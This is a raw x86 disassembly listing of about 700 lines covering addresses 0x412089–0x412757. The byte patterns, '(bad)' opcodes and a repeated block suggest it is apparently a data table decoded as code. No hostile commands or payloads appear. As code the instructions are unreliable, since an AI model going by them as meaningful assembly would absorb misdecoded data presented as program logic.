  412089:	sub    al,BYTE PTR [ecx]
  41208b:	add    BYTE PTR [edx+ebp*1+0x2ab40001],ch
  412092:	add    DWORD PTR [eax],eax
  412094:	shr    BYTE PTR [edx],0x1
  412097:	add    ah,dl
  412099:	sub    al,BYTE PTR [ecx]
  41209b:	add    dh,bl
  41209d:	sub    al,BYTE PTR [ecx]
  41209f:	add    al,ch
  4120a1:	sub    al,BYTE PTR [ecx]
  4120a3:	add    al,dh
  4120a5:	sub    al,BYTE PTR [ecx]
  4120a7:	add    BYTE PTR [eax],al
  4120a9:	sub    eax,DWORD PTR [ecx]
  4120ab:	add    BYTE PTR [edx],cl
  4120ad:	sub    eax,DWORD PTR [ecx]
  4120af:	add    BYTE PTR [eax],al
  4120b1:	add    BYTE PTR [eax],al
  4120b3:	add    BYTE PTR [eax],ah
  4120b5:	sub    eax,DWORD PTR [ecx]
  4120b7:	add    BYTE PTR [ebx+ebp*1],dh
  4120ba:	add    DWORD PTR [eax],eax
  4120bc:	inc    esi
  4120bd:	sub    eax,DWORD PTR [ecx]
  4120bf:	add    BYTE PTR [edx+0x2b],dl
  4120c2:	add    DWORD PTR [eax],eax
  4120c4:	sub    eax,DWORD PTR fs:[ecx]
  4120c7:	add    BYTE PTR [esi+0x2b],dh
  4120ca:	add    DWORD PTR [eax],eax
  4120cc:	nop
  4120cd:	sub    eax,DWORD PTR [ecx]
  4120cf:	add    BYTE PTR [esi-0x47fffed5],ah
  4120d5:	sub    eax,DWORD PTR [ecx]
  4120d7:	add    ah,al
  4120d9:	sub    eax,DWORD PTR [ecx]
  4120db:	add    dl,dl
  4120dd:	sub    eax,DWORD PTR [ecx]
  4120df:	add    al,ah
  4120e1:	sub    eax,DWORD PTR [ecx]
  4120e3:	add    dl,ch
  4120e5:	sub    eax,DWORD PTR [ecx]
  4120e7:	add    dl,bh
  4120e9:	sub    eax,DWORD PTR [ecx]
  4120eb:	add    BYTE PTR [edx],cl
  4120ed:	sub    al,0x1
  4120ef:	add    BYTE PTR [esi],dl
  4120f1:	sub    al,0x1
  4120f3:	add    BYTE PTR [eax],dh
  4120f5:	sub    al,0x1
  4120f7:	add    BYTE PTR [esp+ebp*1],bh
  4120fa:	add    DWORD PTR [eax],eax
  4120fc:	inc    esi
  4120fd:	sub    al,0x1
  4120ff:	add    BYTE PTR [esi+0x2c],dl
  412102:	add    DWORD PTR [eax],eax
  412104:	bound  ebp,QWORD PTR [ecx+eax*1]
  412107:	add    BYTE PTR [eax+0x2c],bh
  41210a:	add    DWORD PTR [eax],eax
  41210c:	test   BYTE PTR [ecx+eax*1],ch
  41210f:	add    BYTE PTR [eax-0x57fffed4],bl
  412115:	sub    al,0x1
  412117:	add    BYTE PTR [esp+ebp*1+0x2cc40001],dh
  41211e:	add    DWORD PTR [eax],eax
  412120:	(bad)  
  412121:	sub    al,0x1
  412123:	add    al,ch
  412125:	sub    al,0x1
  412127:	add    dh,bh
  412129:	sub    al,0x1
  41212b:	add    BYTE PTR [esi],cl
  41212d:	sub    eax,0x2d1e0001
  412132:	add    DWORD PTR [eax],eax
  412134:	sub    ch,BYTE PTR ds:0x2d3a0001
  41213a:	add    DWORD PTR [eax],eax
  41213c:	dec    esp
  41213d:	sub    eax,0x2d5e0001
  412142:	add    DWORD PTR [eax],eax
  412144:	je     0x412173
  412146:	add    DWORD PTR [eax],eax
  412148:	sub    BYTE PTR ds:0x2d900001,0x1
  41214f:	add    BYTE PTR [esi-0x4bfffed3],bl
  412155:	sub    eax,0x2dc00001
  41215a:	add    DWORD PTR [eax],eax
  41215c:	shr    BYTE PTR ds:0x2de40001,cl
  412162:	add    DWORD PTR [eax],eax
  412164:	imul   BYTE PTR ds:0x2e020001
  41216a:	add    DWORD PTR [eax],eax
  41216c:	adc    BYTE PTR [esi],ch
  41216e:	add    DWORD PTR [eax],eax
  412170:	and    BYTE PTR [esi],ch
  412172:	add    DWORD PTR [eax],eax
  412174:	sub    al,0x2e
  412176:	add    DWORD PTR [eax],eax
  412178:	ds add DWORD PTR cs:[eax],eax
  41217c:	dec    esp
  41217d:	add    DWORD PTR cs:[eax],eax
  412180:	pop    edx
  412181:	add    DWORD PTR cs:[eax],eax
  412184:	jo     0x4121b4
  412186:	add    DWORD PTR [eax],eax
  412188:	jle    0x4121b8
  41218a:	add    DWORD PTR [eax],eax
  41218c:	mov    ch,BYTE PTR [esi]
  41218e:	add    DWORD PTR [eax],eax
  412190:	call   0x12e:0xae00012e
  412197:	add    ah,al
  412199:	add    DWORD PTR cs:[eax],eax
  41219c:	aam    0x2e
  41219e:	add    DWORD PTR [eax],eax
  4121a0:	fisubr WORD PTR [esi]
  4121a2:	add    DWORD PTR [eax],eax
  4121a4:	in     al,dx
  4121a5:	add    DWORD PTR cs:[eax],eax
  4121a8:	(bad)  
  4121a9:	add    DWORD PTR cs:[eax],eax
  4121ac:	or     al,0x2f
  4121ae:	add    DWORD PTR [eax],eax
  4121b0:	and    al,0x2f
  4121b2:	add    DWORD PTR [eax],eax
  4121b4:	ss das 
  4121b6:	add    DWORD PTR [eax],eax
  4121b8:	dec    eax
  4121b9:	das    
  4121ba:	add    DWORD PTR [eax],eax
  4121bc:	push   esi
  4121bd:	das    
  4121be:	add    DWORD PTR [eax],eax
  4121c0:	fs das 
  4121c2:	add    DWORD PTR [eax],eax
  4121c4:	js     0x4121f5
  4121c6:	add    DWORD PTR [eax],eax
  4121c8:	mov    ch,BYTE PTR [edi]
  4121ca:	add    DWORD PTR [eax],eax
  4121cc:	pushf  
  4121cd:	das    
  4121ce:	add    DWORD PTR [eax],eax
  4121d0:	test   al,0x2f
  4121d2:	add    DWORD PTR [eax],eax
  4121d4:	mov    esp,0xc800012f
  4121d9:	das    
  4121da:	add    DWORD PTR [eax],eax
  4121dc:	fisubr WORD PTR [edi]
  4121de:	add    DWORD PTR [eax],eax
  4121e0:	repnz das 
  4121e2:	add    DWORD PTR [eax],eax
  4121e4:	(bad)  
  4121e5:	das    
  4121e6:	add    DWORD PTR [eax],eax
  4121e8:	or     BYTE PTR [eax],dh
  4121ea:	add    DWORD PTR [eax],eax
  4121ec:	push   ss
  4121ed:	xor    BYTE PTR [ecx],al
  4121ef:	add    BYTE PTR [esi],ah
  4121f1:	xor    BYTE PTR [ecx],al
  4121f3:	add    BYTE PTR [esi],bh
  4121f5:	xor    BYTE PTR [ecx],al
  4121f7:	add    BYTE PTR [eax+0x30],dl
  4121fa:	add    DWORD PTR [eax],eax
  4121fc:	bound  esi,QWORD PTR [eax]
  4121fe:	add    DWORD PTR [eax],eax
  412200:	outs   dx,BYTE PTR ds:[esi]
  412201:	xor    BYTE PTR [ecx],al
  412203:	add    BYTE PTR [eax-0x71fffed0],al
  412209:	xor    BYTE PTR [ecx],al
  41220b:	add    BYTE PTR [eax+esi*1+0x30ac0001],bl
  412212:	add    DWORD PTR [eax],eax
  412214:	mov    esi,0xcc000130
  412219:	xor    BYTE PTR [ecx],al
  41221b:	add    al,bl
  41221d:	xor    BYTE PTR [ecx],al
  41221f:	add    dh,ah
  412221:	xor    BYTE PTR [ecx],al
  412223:	add    al,bh
  412225:	xor    BYTE PTR [ecx],al
  412227:	add    BYTE PTR [esi],al
  412229:	xor    DWORD PTR [ecx],eax
  41222b:	add    BYTE PTR [edx],dl
  41222d:	xor    DWORD PTR [ecx],eax
  41222f:	add    BYTE PTR [ecx+esi*1],ah
  412232:	add    DWORD PTR [eax],eax
  412234:	cmp    BYTE PTR [ecx],dh
  412236:	add    DWORD PTR [eax],eax
  412238:	dec    edx
  412239:	xor    DWORD PTR [ecx],eax
  41223b:	add    BYTE PTR [edx+0x31],bl
  41223e:	add    DWORD PTR [eax],eax
  412240:	push   0x31
  412242:	add    DWORD PTR [eax],eax
  412244:	js     0x412277
  412246:	add    DWORD PTR [eax],eax
  412248:	xchg   esi,eax
  412249:	xor    DWORD PTR [ecx],eax
  41224b:	add    BYTE PTR [ecx+esi*1+0x31b40001],ah
  412252:	add    DWORD PTR [eax],eax
  412254:	shl    BYTE PTR [ecx],cl
  412256:	add    DWORD PTR [eax],eax
  412258:	in     al,0x31
  41225a:	add    DWORD PTR [eax],eax
  41225c:	cld    
  41225d:	xor    DWORD PTR [ecx],eax
  41225f:	add    BYTE PTR [edx],cl
  412261:	xor    al,BYTE PTR [ecx]
  412263:	add    BYTE PTR [eax],al
  412265:	add    BYTE PTR [eax],al
  412267:	add    BYTE PTR [edx+esi*1],ch
  41226a:	add    DWORD PTR [eax],eax
  41226c:	inc    esp
  41226d:	xor    al,BYTE PTR [ecx]
  41226f:	add    BYTE PTR [esi+0x32],dl
  412272:	add    DWORD PTR [eax],eax
  412274:	outs   dx,BYTE PTR ds:[esi]
  412275:	xor    al,BYTE PTR [ecx]
  412277:	add    BYTE PTR [eax-0x63fffece],al
  41227d:	xor    al,BYTE PTR [ecx]
  41227f:	add    BYTE PTR [eax],al
  412281:	add    BYTE PTR [eax],al
  412283:	add    BYTE PTR [edx+esi*1+0x32d60001],bh
  41228a:	add    DWORD PTR [eax],eax
  41228c:	out    0x32,al
  41228e:	add    DWORD PTR [eax],eax
  412290:	cli    
  412291:	xor    al,BYTE PTR [ecx]
  412293:	add    BYTE PTR [edx],cl
  412295:	xor    eax,DWORD PTR [ecx]
  412297:	add    BYTE PTR [eax],ah
  412299:	xor    eax,DWORD PTR [ecx]
  41229b:	add    BYTE PTR [esi],dh
  41229d:	xor    eax,DWORD PTR [ecx]
  41229f:	add    BYTE PTR [ebx+esi*1+0x1],al
  4122a3:	add    BYTE PTR [eax+0x33],dl
  4122a6:	add    DWORD PTR [eax],eax
  4122a8:	pop    esp
  4122a9:	xor    eax,DWORD PTR [ecx]
  4122ab:	add    BYTE PTR [esi+0x33],ah
  4122ae:	add    DWORD PTR [eax],eax
  4122b0:	je     0x4122e5
  4122b2:	add    DWORD PTR [eax],eax
  4122b4:	xor    BYTE PTR [ebx],0x1
  4122b7:	add    BYTE PTR [ebx+esi*1+0x33aa0001],bl
  4122be:	add    DWORD PTR [eax],eax
  4122c0:	ret    0x133
  4122c3:	add    dh,dl
  4122c5:	xor    eax,DWORD PTR [ecx]
  4122c7:	add    dh,ch
  4122c9:	xor    eax,DWORD PTR [ecx]
  4122cb:	add    ah,bh
  4122cd:	xor    eax,DWORD PTR [ecx]
  4122cf:	add    BYTE PTR [esi],dl
  4122d1:	xor    al,0x1
  4122d3:	add    BYTE PTR [edx],ch
  4122d5:	xor    al,0x1
  4122d7:	add    BYTE PTR [esp+esi*1],dh
  4122da:	add    DWORD PTR [eax],eax
  4122dc:	inc    esp
  4122dd:	xor    al,0x1
  4122df:	add    BYTE PTR [esi+0x34],cl
  4122e2:	add    DWORD PTR [eax],eax
  4122e4:	pop    edx
  4122e5:	xor    al,0x1
  4122e7:	add    BYTE PTR [esi+0x34],ch
  4122ea:	add    DWORD PTR [eax],eax
  4122ec:	xchg   BYTE PTR [ecx+eax*1],dh
  4122ef:	add    BYTE PTR [esp+esi*1+0x349e0001],dl
  4122f6:	add    DWORD PTR [eax],eax
  4122f8:	mov    dl,0x34
  4122fa:	add    DWORD PTR [eax],eax
  4122fc:	enter  0x134,0x0
  412300:	fidiv  DWORD PTR [ecx+eax*1]
  412303:	add    dh,ah
  412305:	xor    al,0x1
  412307:	add    dl,bh
  412309:	xor    al,0x1
  41230b:	add    BYTE PTR [esi*1+0x350e0001],al
  412312:	add    DWORD PTR [eax],eax
  412314:	push   ds
  412315:	xor    eax,0x35360001
  41231a:	add    DWORD PTR [eax],eax
  41231c:	dec    edx
  41231d:	xor    eax,0x355a0001
  412322:	add    DWORD PTR [eax],eax
  412324:	xor    ax,0x1
  412328:	je     0x41235f
  41232a:	add    DWORD PTR [eax],eax
  41232c:	mov    dh,BYTE PTR ds:0x359c0001
  412332:	add    DWORD PTR [eax],eax
  412334:	add    BYTE PTR [eax],al
  412336:	add    BYTE PTR [eax],al
  412338:	mov    edx,0xce000135
  41233d:	xor    eax,0x35e00001
  412342:	add    DWORD PTR [eax],eax
  412344:	in     al,dx
  412345:	xor    eax,0x36040001
  41234a:	add    DWORD PTR [eax],eax
  41234c:	adc    al,0x36
  41234e:	add    DWORD PTR [eax],eax
  412350:	sub    BYTE PTR [esi],dh
  412352:	add    DWORD PTR [eax],eax
  412354:	ds add DWORD PTR ss:[eax],eax
  412358:	dec    esi
  412359:	add    DWORD PTR ss:[eax],eax
  41235c:	pusha  
  41235d:	add    DWORD PTR ss:[eax],eax
  412360:	ins    BYTE PTR es:[edi],dx
  412361:	add    DWORD PTR ss:[eax],eax
  412364:	xor    BYTE PTR [esi],0x1
  412367:	add    BYTE PTR [esi-0x49fffeca],bl
  41236d:	add    DWORD PTR ss:[eax],eax
  412370:	retf   0x136
  412373:	add    dl,bl
  412375:	add    DWORD PTR ss:[eax],eax
  412378:	out    0x36,al
  41237a:	add    DWORD PTR [eax],eax
  41237c:	(bad)  
  41237d:	add    DWORD PTR ss:[eax],eax
  412380:	adc    BYTE PTR [edi],dh
  412382:	add    DWORD PTR [eax],eax
  412384:	and    dh,BYTE PTR [edi]
  412386:	add    DWORD PTR [eax],eax
  412388:	xor    dh,BYTE PTR [edi]
  41238a:	add    DWORD PTR [eax],eax
  41238c:	inc    esp
  41238d:	aaa    
  41238e:	add    DWORD PTR [eax],eax
  412390:	push   eax
  412391:	aaa    
  412392:	add    DWORD PTR [eax],eax
  412394:	pusha  
  412395:	aaa    
  412396:	add    DWORD PTR [eax],eax
  412398:	outs   dx,BYTE PTR ds:[esi]
  412399:	aaa    
  41239a:	add    DWORD PTR [eax],eax
  41239c:	js     0x4123d5
  41239e:	add    DWORD PTR [eax],eax
  4123a0:	mov    BYTE PTR [edi],dh
  4123a2:	add    DWORD PTR [eax],eax
  4123a4:	xchg   esi,eax
  4123a5:	aaa    
  4123a6:	add    DWORD PTR [eax],eax
  4123a8:	test   al,0x37
  4123aa:	add    DWORD PTR [eax],eax
  4123ac:	mov    esi,0xd2000137
  4123b1:	aaa    
  4123b2:	add    DWORD PTR [eax],eax
  4123b4:	jmp    0x138:0x137
  4123bb:	add    BYTE PTR [esi],cl
  4123bd:	cmp    BYTE PTR [ecx],al
  4123bf:	add    BYTE PTR [esi],ah
  4123c1:	cmp    BYTE PTR [ecx],al
  4123c3:	add    BYTE PTR [eax+edi*1],bh
  4123c6:	add    DWORD PTR [eax],eax
  4123c8:	dec    esp
  4123c9:	cmp    BYTE PTR [ecx],al
  4123cb:	add    BYTE PTR [eax+0x38],bl
  4123ce:	add    DWORD PTR [eax],eax
  4123d0:	jo     0x41240a
  4123d2:	add    DWORD PTR [eax],eax
  4123d4:	jle    0x41240e
  4123d6:	add    DWORD PTR [eax],eax
  4123d8:	xchg   edx,eax
  4123d9:	cmp    BYTE PTR [ecx],al
  4123db:	add    BYTE PTR [esi-0x51fffec8],bl
  4123e1:	cmp    BYTE PTR [ecx],al
  4123e3:	add    dh,al
  4123e5:	cmp    BYTE PTR [ecx],al
  4123e7:	add    dl,bl
  4123e9:	cmp    BYTE PTR [ecx],al
  4123eb:	add    al,ch
  4123ed:	cmp    BYTE PTR [ecx],al
  4123ef:	add    dh,bh
  4123f1:	cmp    BYTE PTR [ecx],al
  4123f3:	add    BYTE PTR [edx],dl
  4123f5:	cmp    DWORD PTR [ecx],eax
  4123f7:	add    BYTE PTR [esi],bl
  4123f9:	cmp    DWORD PTR [ecx],eax
  4123fb:	add    BYTE PTR [eax],bh
  4123fd:	cmp    DWORD PTR [ecx],eax
  4123ff:	add    BYTE PTR [eax],al
  412401:	add    BYTE PTR [eax],al
  412403:	add    BYTE PTR [ecx+edi*1+0x1],bl
  412407:	add    BYTE PTR [edx+0x39],dh
  41240a:	add    DWORD PTR [eax],eax
	...
  412414:	popf   
  412415:	dec    esp
  412416:	(bad)  
  412417:	dec    ebp
  412418:	add    BYTE PTR [eax],al
  41241a:	add    BYTE PTR [eax],al
  41241c:	add    al,BYTE PTR [eax]
  41241e:	add    BYTE PTR [eax],al
  412420:	inc    edx
  412421:	add    BYTE PTR [eax],al
  412423:	add    ah,dl
  412425:	cmp    DWORD PTR [ebx],eax
  412427:	add    ah,dl
  412429:	sub    DWORD PTR [ebx],eax
	...
  412433:	add    BYTE PTR [ebp+0x4dc74c],bl
  412439:	add    BYTE PTR [eax],al
  41243b:	add    BYTE PTR [edx+0x24],ah
  41243e:	add    DWORD PTR [eax],eax
  412440:	add    DWORD PTR [eax],eax
  412442:	add    BYTE PTR [eax],al
  412444:	add    DWORD PTR [eax],eax
  412446:	add    BYTE PTR [eax],al
  412448:	add    DWORD PTR [eax],eax
  41244a:	add    BYTE PTR [eax],al
  41244c:	pop    eax
  41244d:	and    al,0x1
  41244f:	add    BYTE PTR [esp+0x1],bl
  412453:	add    BYTE PTR [eax+0x24],ah
  412456:	add    DWORD PTR [eax],eax
  412458:	lock xor al,BYTE PTR [eax]
  41245b:	add    BYTE PTR [ebx+0x24],dh
  41245e:	add    DWORD PTR [eax],eax
  412460:	add    BYTE PTR [eax],al
  412462:	outs   dx,BYTE PTR ds:[esi]
  412463:	push   esi
  412464:	popa   
  412465:	addr16 inc edi
  412467:	push   edi
  412468:	js     0x4124be
  41246a:	outs   dx,DWORD PTR ds:[esi]
  41246b:	ss addr16 xor al,0x2e
  41246f:	je     0x4124e0
  412471:	jo     0x412473
  412473:	aas    
  412474:	inc    edi
  412475:	outs   dx,BYTE PTR gs:[esi]
  412477:	gs jb  0x4124db
  41247a:	je     0x4124e1
  41247c:	push   esp
  41247d:	gs js  0x4124f4
  412480:	push   edi
  412481:	inc    eax
  412482:	inc    eax
  412483:	pop    ecx
  412484:	inc    edi
  412485:	push   eax
  412486:	inc    ecx
  412487:	dec    edx
  412488:	pop    edi
  412489:	dec    esi
  41248a:	cmp    al,0x56
  41248c:	add    BYTE PTR [eax],al
  41248e:	add    BYTE PTR [eax],al
  412490:	sbb    al,0x25
  412492:	add    DWORD PTR [eax],eax
	...
  41249c:	adc    al,0x2b
  41249e:	add    DWORD PTR [eax],eax
  4124a0:	add    BYTE PTR [eax],ah
  4124a2:	add    DWORD PTR [eax],eax
  4124a4:	shl    BYTE PTR ds:0x1,1
  4124aa:	add    BYTE PTR [eax],al
  4124ac:	add    BYTE PTR [eax],al
  4124ae:	add    BYTE PTR [eax],al
  4124b0:	and    BYTE PTR [edx],dh
  4124b2:	add    DWORD PTR [eax],eax
  4124b4:	mov    ah,0x20
  4124b6:	add    DWORD PTR [eax],eax
  4124b8:	test   BYTE PTR [edi],ah
  4124ba:	add    DWORD PTR [eax],eax
	...
  4124c4:	scas   al,BYTE PTR es:[edi]
  4124c5:	xor    al,BYTE PTR [ecx]
  4124c7:	add    BYTE PTR [eax+0x22],ch
  4124ca:	add    DWORD PTR [eax],eax
  4124cc:	mov    al,ds:0x127
  4124d1:	add    BYTE PTR [eax],al
  4124d3:	add    BYTE PTR [eax],al
  4124d5:	add    BYTE PTR [eax],al
  4124d7:	add    BYTE PTR [eax-0x7bfffecb],dh
  4124dd:	and    al,BYTE PTR [ecx]
  4124df:	add    BYTE PTR [eax+ebp*1+0x1],dl
	...
  4124eb:	add    BYTE PTR [esi+0x39],cl
  4124ee:	add    DWORD PTR [eax],eax
  4124f0:	cmp    BYTE PTR [ebx],ah
  4124f2:	add    DWORD PTR [eax],eax
  4124f4:	and    BYTE PTR [ecx],ch
  4124f6:	add    DWORD PTR [eax],eax
	...
  412500:	mov    BYTE PTR [ecx],bh
  412502:	add    DWORD PTR [eax],eax
  412504:	add    al,0x24
  412506:	add    DWORD PTR [eax],eax
	...
  41251c:	sub    al,0x29
  41251e:	add    DWORD PTR [eax],eax
  412520:	sub    DWORD PTR ss:[ecx],eax
  412523:	add    BYTE PTR [eax+0x29],al
  412526:	add    DWORD PTR [eax],eax
  412528:	dec    esi
  412529:	sub    DWORD PTR [ecx],eax
  41252b:	add    BYTE PTR [eax+0x29],bl
  41252e:	add    DWORD PTR [eax],eax
  412530:	bound  ebp,QWORD PTR [ecx]
  412532:	add    DWORD PTR [eax],eax
  412534:	ins    BYTE PTR es:[edi],dx
  412535:	sub    DWORD PTR [ecx],eax
  412537:	add    BYTE PTR [esi+0x29],dh
  41253a:	add    DWORD PTR [eax],eax
  41253c:	mov    BYTE PTR [ecx],ch
  41253e:	add    DWORD PTR [eax],eax
  412540:	xchg   edx,eax
  412541:	sub    DWORD PTR [ecx],eax
  412543:	add    BYTE PTR [edx-0x5dfffed7],bl
  412549:	sub    DWORD PTR [ecx],eax
  41254b:	add    BYTE PTR [esi-0x43fffed7],ch
  412551:	sub    DWORD PTR [ecx],eax
  412553:	add    dh,al
  412555:	sub    DWORD PTR [ecx],eax
  412557:	add    dl,dl
  412559:	sub    DWORD PTR [ecx],eax
  41255b:	add    ah,bl
  41255d:	sub    DWORD PTR [ecx],eax
  41255f:	add    ah,ch
  412561:	sub    DWORD PTR [ecx],eax
  412563:	add    ah,dh
  412565:	sub    DWORD PTR [ecx],eax
  412567:	add    ah,bh
  412569:	sub    DWORD PTR [ecx],eax
  41256b:	add    BYTE PTR [esi],al
  41256d:	sub    al,BYTE PTR [ecx]
  41256f:	add    BYTE PTR [edx],dl
  412571:	sub    al,BYTE PTR [ecx]
  412573:	add    BYTE PTR [esi],bl
  412575:	sub    al,BYTE PTR [ecx]
  412577:	add    BYTE PTR [edx+ebp*1],ch
  41257a:	add    DWORD PTR [eax],eax
  41257c:	sub    al,BYTE PTR ss:[ecx]
  41257f:	add    BYTE PTR [edx+0x2a],al
  412582:	add    DWORD PTR [eax],eax
  412584:	dec    esp
  412585:	sub    al,BYTE PTR [ecx]
  412587:	add    BYTE PTR [esi+0x2a],dl
  41258a:	add    DWORD PTR [eax],eax
  41258c:	sub    al,BYTE PTR fs:[ecx]
  41258f:	add    BYTE PTR [eax+0x2a],dh
  412592:	add    DWORD PTR [eax],eax
  412594:	js     0x4125c0
  412596:	add    DWORD PTR [eax],eax
  412598:	xchg   BYTE PTR [edx],ch
  41259a:	add    DWORD PTR [eax],eax
  41259c:	nop
  41259d:	sub    al,BYTE PTR [ecx]
  41259f:	add    BYTE PTR [eax-0x5dfffed6],bl
  4125a5:	sub    al,BYTE PTR [ecx]
  4125a7:	add    BYTE PTR [edx+ebp*1+0x2ab40001],ch
  4125ae:	add    DWORD PTR [eax],eax
  4125b0:	shr    BYTE PTR [edx],0x1
  4125b3:	add    ah,dl
  4125b5:	sub    al,BYTE PTR [ecx]
  4125b7:	add    dh,bl
  4125b9:	sub    al,BYTE PTR [ecx]
  4125bb:	add    al,ch
  4125bd:	sub    al,BYTE PTR [ecx]
  4125bf:	add    al,dh
  4125c1:	sub    al,BYTE PTR [ecx]
  4125c3:	add    BYTE PTR [eax],al
  4125c5:	sub    eax,DWORD PTR [ecx]
  4125c7:	add    BYTE PTR [edx],cl
  4125c9:	sub    eax,DWORD PTR [ecx]
  4125cb:	add    BYTE PTR [eax],al
  4125cd:	add    BYTE PTR [eax],al
  4125cf:	add    BYTE PTR [eax],ah
  4125d1:	sub    eax,DWORD PTR [ecx]
  4125d3:	add    BYTE PTR [ebx+ebp*1],dh
  4125d6:	add    DWORD PTR [eax],eax
  4125d8:	inc    esi
  4125d9:	sub    eax,DWORD PTR [ecx]
  4125db:	add    BYTE PTR [edx+0x2b],dl
  4125de:	add    DWORD PTR [eax],eax
  4125e0:	sub    eax,DWORD PTR fs:[ecx]
  4125e3:	add    BYTE PTR [esi+0x2b],dh
  4125e6:	add    DWORD PTR [eax],eax
  4125e8:	nop
  4125e9:	sub    eax,DWORD PTR [ecx]
  4125eb:	add    BYTE PTR [esi-0x47fffed5],ah
  4125f1:	sub    eax,DWORD PTR [ecx]
  4125f3:	add    ah,al
  4125f5:	sub    eax,DWORD PTR [ecx]
  4125f7:	add    dl,dl
  4125f9:	sub    eax,DWORD PTR [ecx]
  4125fb:	add    al,ah
  4125fd:	sub    eax,DWORD PTR [ecx]
  4125ff:	add    dl,ch
  412601:	sub    eax,DWORD PTR [ecx]
  412603:	add    dl,bh
  412605:	sub    eax,DWORD PTR [ecx]
  412607:	add    BYTE PTR [edx],cl
  412609:	sub    al,0x1
  41260b:	add    BYTE PTR [esi],dl
  41260d:	sub    al,0x1
  41260f:	add    BYTE PTR [eax],dh
  412611:	sub    al,0x1
  412613:	add    BYTE PTR [esp+ebp*1],bh
  412616:	add    DWORD PTR [eax],eax
  412618:	inc    esi
  412619:	sub    al,0x1
  41261b:	add    BYTE PTR [esi+0x2c],dl
  41261e:	add    DWORD PTR [eax],eax
  412620:	bound  ebp,QWORD PTR [ecx+eax*1]
  412623:	add    BYTE PTR [eax+0x2c],bh
  412626:	add    DWORD PTR [eax],eax
  412628:	test   BYTE PTR [ecx+eax*1],ch
  41262b:	add    BYTE PTR [eax-0x57fffed4],bl
  412631:	sub    al,0x1
  412633:	add    BYTE PTR [esp+ebp*1+0x2cc40001],dh
  41263a:	add    DWORD PTR [eax],eax
  41263c:	(bad)  
  41263d:	sub    al,0x1
  41263f:	add    al,ch
  412641:	sub    al,0x1
  412643:	add    dh,bh
  412645:	sub    al,0x1
  412647:	add    BYTE PTR [esi],cl
  412649:	sub    eax,0x2d1e0001
  41264e:	add    DWORD PTR [eax],eax
  412650:	sub    ch,BYTE PTR ds:0x2d3a0001
  412656:	add    DWORD PTR [eax],eax
  412658:	dec    esp
  412659:	sub    eax,0x2d5e0001
  41265e:	add    DWORD PTR [eax],eax
  412660:	je     0x41268f
  412662:	add    DWORD PTR [eax],eax
  412664:	sub    BYTE PTR ds:0x2d900001,0x1
  41266b:	add    BYTE PTR [esi-0x4bfffed3],bl
  412671:	sub    eax,0x2dc00001
  412676:	add    DWORD PTR [eax],eax
  412678:	shr    BYTE PTR ds:0x2de40001,cl
  41267e:	add    DWORD PTR [eax],eax
  412680:	imul   BYTE PTR ds:0x2e020001
  412686:	add    DWORD PTR [eax],eax
  412688:	adc    BYTE PTR [esi],ch
  41268a:	add    DWORD PTR [eax],eax
  41268c:	and    BYTE PTR [esi],ch
  41268e:	add    DWORD PTR [eax],eax
  412690:	sub    al,0x2e
  412692:	add    DWORD PTR [eax],eax
  412694:	ds add DWORD PTR cs:[eax],eax
  412698:	dec    esp
  412699:	add    DWORD PTR cs:[eax],eax
  41269c:	pop    edx
  41269d:	add    DWORD PTR cs:[eax],eax
  4126a0:	jo     0x4126d0
  4126a2:	add    DWORD PTR [eax],eax
  4126a4:	jle    0x4126d4
  4126a6:	add    DWORD PTR [eax],eax
  4126a8:	mov    ch,BYTE PTR [esi]
  4126aa:	add    DWORD PTR [eax],eax
  4126ac:	call   0x12e:0xae00012e
  4126b3:	add    ah,al
  4126b5:	add    DWORD PTR cs:[eax],eax
  4126b8:	aam    0x2e
  4126ba:	add    DWORD PTR [eax],eax
  4126bc:	fisubr WORD PTR [esi]
  4126be:	add    DWORD PTR [eax],eax
  4126c0:	in     al,dx
  4126c1:	add    DWORD PTR cs:[eax],eax
  4126c4:	(bad)  
  4126c5:	add    DWORD PTR cs:[eax],eax
  4126c8:	or     al,0x2f
  4126ca:	add    DWORD PTR [eax],eax
  4126cc:	and    al,0x2f
  4126ce:	add    DWORD PTR [eax],eax
  4126d0:	ss das 
  4126d2:	add    DWORD PTR [eax],eax
  4126d4:	dec    eax
  4126d5:	das    
  4126d6:	add    DWORD PTR [eax],eax
  4126d8:	push   esi
  4126d9:	das    
  4126da:	add    DWORD PTR [eax],eax
  4126dc:	fs das 
  4126de:	add    DWORD PTR [eax],eax
  4126e0:	js     0x412711
  4126e2:	add    DWORD PTR [eax],eax
  4126e4:	mov    ch,BYTE PTR [edi]
  4126e6:	add    DWORD PTR [eax],eax
  4126e8:	pushf  
  4126e9:	das    
  4126ea:	add    DWORD PTR [eax],eax
  4126ec:	test   al,0x2f
  4126ee:	add    DWORD PTR [eax],eax
  4126f0:	mov    esp,0xc800012f
  4126f5:	das    
  4126f6:	add    DWORD PTR [eax],eax
  4126f8:	fisubr WORD PTR [edi]
  4126fa:	add    DWORD PTR [eax],eax
  4126fc:	repnz das 
  4126fe:	add    DWORD PTR [eax],eax
  412700:	(bad)  
  412701:	das    
  412702:	add    DWORD PTR [eax],eax
  412704:	or     BYTE PTR [eax],dh
  412706:	add    DWORD PTR [eax],eax
  412708:	push   ss
  412709:	xor    BYTE PTR [ecx],al
  41270b:	add    BYTE PTR [esi],ah
  41270d:	xor    BYTE PTR [ecx],al
  41270f:	add    BYTE PTR [esi],bh
  412711:	xor    BYTE PTR [ecx],al
  412713:	add    BYTE PTR [eax+0x30],dl
  412716:	add    DWORD PTR [eax],eax
  412718:	bound  esi,QWORD PTR [eax]
  41271a:	add    DWORD PTR [eax],eax
  41271c:	outs   dx,BYTE PTR ds:[esi]
  41271d:	xor    BYTE PTR [ecx],al
  41271f:	add    BYTE PTR [eax-0x71fffed0],al
  412725:	xor    BYTE PTR [ecx],al
  412727:	add    BYTE PTR [eax+esi*1+0x30ac0001],bl
  41272e:	add    DWORD PTR [eax],eax
  412730:	mov    esi,0xcc000130
  412735:	xor    BYTE PTR [ecx],al
  412737:	add    al,bl
  412739:	xor    BYTE PTR [ecx],al
  41273b:	add    dh,ah
  41273d:	xor    BYTE PTR [ecx],al
  41273f:	add    al,bh
  412741:	xor    BYTE PTR [ecx],al
  412743:	add    BYTE PTR [esi],al
  412745:	xor    DWORD PTR [ecx],eax
  412747:	add    BYTE PTR [edx],dl
  412749:	xor    DWORD PTR [ecx],eax
  41274b:	add    BYTE PTR [ecx+esi*1],ah
  41274e:	add    DWORD PTR [eax],eax
  412750:	cmp    BYTE PTR [ecx],dh
  412752:	add    DWORD PTR [eax],eax
  412754:	dec    edx
  412755:	xor    DWORD PTR [ecx],eax
  412757:	add    BYTE PTR [edx+0x31],bl
